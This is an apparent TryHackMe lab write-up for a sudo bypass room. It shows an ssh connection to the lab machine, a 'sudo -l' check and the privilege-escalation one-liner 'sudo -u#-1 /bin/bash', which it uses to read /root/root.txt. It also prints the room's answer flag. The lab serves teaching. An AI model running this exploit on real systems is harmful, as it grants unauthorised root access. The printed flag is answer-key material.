# Sudo Security Bypass

## Task 1 - Deploy

I mean, there's not a lot to do here...

## Task 2 - Security Bypass

Connecting to the machine using ssh:
```bash
ssh tryhackme@10.10.201.79 -p 2222
```

### 1. What command are you allowed to run with sudo?
```
/bin/bash
```
We can run `sudo -l` to see all the commans that our user can run with sudo.

### 2. What is the flag in /root/root.txt?
```
THM{l33t_s3cur1ty_bypass}
```
Once we know that we dont have root access, we can elevate our privileges with the following command:
```bash
sudo -u#-1 /bin/bash
```
This will change our user into root, and with that we can just find the flag.
```bash
cat /root/root.txt
```
